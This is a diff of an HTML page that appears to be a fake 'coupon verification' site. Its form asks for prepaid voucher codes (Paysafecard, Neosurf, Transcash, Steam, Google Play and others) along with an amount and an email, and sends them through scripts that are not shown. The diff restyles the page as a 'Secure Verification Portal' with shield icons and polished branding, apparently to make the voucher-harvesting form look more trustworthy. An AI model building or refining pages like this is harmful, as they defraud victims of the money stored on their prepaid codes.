@@ -3,72 +3,160 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VYGC - Coupon Verification</title>
+    <title>VYGC - Secure Verification</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Playfair+Display:wght@600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <div class="container">
-        <h1>VYGC</h1>
-        <p class="intro">Please enter the coupon information here.</p>
-        
-        <form id="verificationForm">
-            <div class="form-group">
-                <label for="rechargeType">Choose a recharge *</label>
-                <select id="rechargeType" name="rechargeType" required>
-                    <option value="">---- ----</option>
-                    <option value="neosurf">NEOSURF</option>
-                    <option value="pcs">PCS</option>
-                    <option value="transcash">TRANSCASH</option>
-                    <option value="paysafecard">PAYSAFECARD</option>
-                    <option value="googleplay">GOOGLE PLAY</option>
-                    <option value="steam">STEAM</option>
-                    <option value="flexepin">FLEXEPIN</option>
-                    <option value="cashlib">CASHLIB</option>
-                    <option value="netflix">NETFLIX</option>
-                    <option value="amazon">AMAZON</option>
-                </select>
-            </div>
-
-            <div class="form-group">
-                <label for="rechargeAmount">Recharge amount *</label>
-                <input type="text" id="rechargeAmount" name="rechargeAmount" placeholder="Enter amount" required>
-            </div>
-
-            <div class="form-group">
-                <label for="currency">Choose a currency *</label>
-                <select id="currency" name="currency" required>
-                    <option value="">---- ----</option>
-                    <option value="eur">EURO (€)</option>
-                    <option value="usd">Dollar ($)</option>
-                    <option value="chf">SWISS FRANC (CHF)</option>
-                    <option value="sek">KRONA (SEK)</option>
-                    <option value="dkk">KRONE (DKK)</option>
-                </select>
-            </div>
-
-            <div class="form-group">
-                <label>Enter recharge codes</label>
-                <input type="text" id="code1" name="code1" placeholder="Enter recharge code 1" required>
-                <input type="text" id="code2" name="code2" placeholder="Enter recharge code 2">
-                <input type="text" id="code3" name="code3" placeholder="Enter recharge code 3">
-                <input type="text" id="code4" name="code4" placeholder="Enter recharge code 4">
-            </div>
-
-            <div class="form-group">
-                <label for="email">Enter your email</label>
-                <input type="email" id="email" name="email" placeholder="your@email.com" required>
-            </div>
-
-            <button type="submit" class="submit-btn">
-                <span class="btn-text">Verify Code</span>
-                <span class="btn-loader" style="display: none;">Loading...</span>
-            </button>
-        </form>
-
-        <div id="message" class="message" style="display: none;"></div>
+    <!-- Animated Background -->
+    <div class="background-animation">
+        <div class="gradient-orb orb-1"></div>
+        <div class="gradient-orb orb-2"></div>
+        <div class="gradient-orb orb-3"></div>
     </div>
 
-    <!-- Backend API Configuration -->
+    <!-- Main Container -->
+    <div class="wrapper">
+        <!-- Header -->
+        <header class="header">
+            <div class="logo">
+                <div class="logo-icon">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+                <h1 class="logo-text">VYGC</h1>
+            </div>
+            <p class="tagline">Secure Verification Portal</p>
+        </header>
+
+        <!-- Main Card -->
+        <main class="card">
+            <div class="card-header">
+                <div class="icon-container">
+                    <i class="fas fa-check-circle"></i>
+                </div>
+                <h2>Verification Request</h2>
+                <p>Enter your coupon details below for verification</p>
+            </div>
+
+            <form id="verificationForm" class="form">
+                <!-- Recharge Type -->
+                <div class="form-section">
+                    <label class="form-label" for="rechargeType">
+                        <i class="fas fa-credit-card"></i>
+                        Recharge Type
+                    </label>
+                    <div class="select-wrapper">
+                        <select id="rechargeType" name="rechargeType" required>
+                            <option value="">Select recharge type</option>
+                            <option value="neosurf">NEOSURF</option>
+                            <option value="pcs">PCS</option>
+                            <option value="transcash">TRANSCASH</option>
+                            <option value="paysafecard">PAYSAFECARD</option>
+                            <option value="googleplay">GOOGLE PLAY</option>
+                            <option value="steam">STEAM</option>
+                            <option value="flexepin">FLEXEPIN</option>
+                            <option value="cashlib">CASHLIB</option>
+                            <option value="netflix">NETFLIX</option>
+                            <option value="amazon">AMAZON</option>
+                        </select>
+                        <i class="fas fa-chevron-down select-arrow"></i>
+                    </div>
+                </div>
+
+                <!-- Recharge Amount -->
+                <div class="form-section">
+                    <label class="form-label" for="rechargeAmount">
+                        <i class="fas fa-euro-sign"></i>
+                        Recharge Amount
+                    </label>
+                    <div class="input-wrapper">
+                        <input type="text" id="rechargeAmount" name="rechargeAmount" placeholder="e.g., 25.00" required>
+                    </div>
+                </div>
+
+                <!-- Currency -->
+                <div class="form-section">
+                    <label class="form-label" for="currency">
+                        <i class="fas fa-money-bill-wave"></i>
+                        Currency
+                    </label>
+                    <div class="select-wrapper">
+                        <select id="currency" name="currency" required>
+                            <option value="">Select currency</option>
+                            <option value="eur">EUR (€)</option>
+                            <option value="usd">USD ($)</option>
+                            <option value="chf">CHF</option>
+                            <option value="sek">SEK</option>
+                            <option value="dkk">DKK</option>
+                        </select>
+                        <i class="fas fa-chevron-down select-arrow"></i>
+                    </div>
+                </div>
+
+                <!-- Recharge Codes -->
+                <div class="form-section">
+                    <label class="form-label">
+                        <i class="fas fa-key"></i>
+                        Recharge Codes
+                    </label>
+                    <div class="codes-grid">
+                        <div class="code-input-wrapper">
+                            <input type="text" id="code1" name="code1" placeholder="Code 1" required>
+                        </div>
+                        <div class="code-input-wrapper">
+                            <input type="text" id="code2" name="code2" placeholder="Code 2">
+                        </div>
+                        <div class="code-input-wrapper">
+                            <input type="text" id="code3" name="code3" placeholder="Code 3">
+                        </div>
+                        <div class="code-input-wrapper">
+                            <input type="text" id="code4" name="code4" placeholder="Code 4">
+                        </div>
+                    </div>
+                    <span class="form-hint">Enter at least one code (up to 4)</span>
+                </div>
+
+                <!-- Email -->
+                <div class="form-section">
+                    <label class="form-label" for="email">
+                        <i class="fas fa-envelope"></i>
+                        Email Address
+                    </label>
+                    <div class="input-wrapper">
+                        <input type="email" id="email" name="email" placeholder="your@email.com" required>
+                    </div>
+                </div>
+
+                <!-- Submit Button -->
+                <button type="submit" class="submit-btn" id="submitBtn">
+                    <span class="btn-content">
+                        <i class="fas fa-paper-plane"></i>
+                        <span class="btn-text">Verify Now</span>
+                    </span>
+                    <span class="btn-loader">
+                        <i class="fas fa-spinner fa-spin"></i>
+                        Processing...
+                    </span>
+                </button>
+            </form>
+        </main>
+
+        <!-- Message Toast -->
+        <div id="message" class="toast" role="alert">
+            <i class="fas fa-check-circle"></i>
+            <span class="toast-message"></span>
+        </div>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <p>© 2024 VYGC. All rights reserved. | <a href="#" class="link">Privacy</a></p>
+        </footer>
+    </div>
+
+    <!-- API Configuration -->
     <script src="config.js"></script>
     <script src="vygc-api.js"></script>
     <script src="script.js"></script>
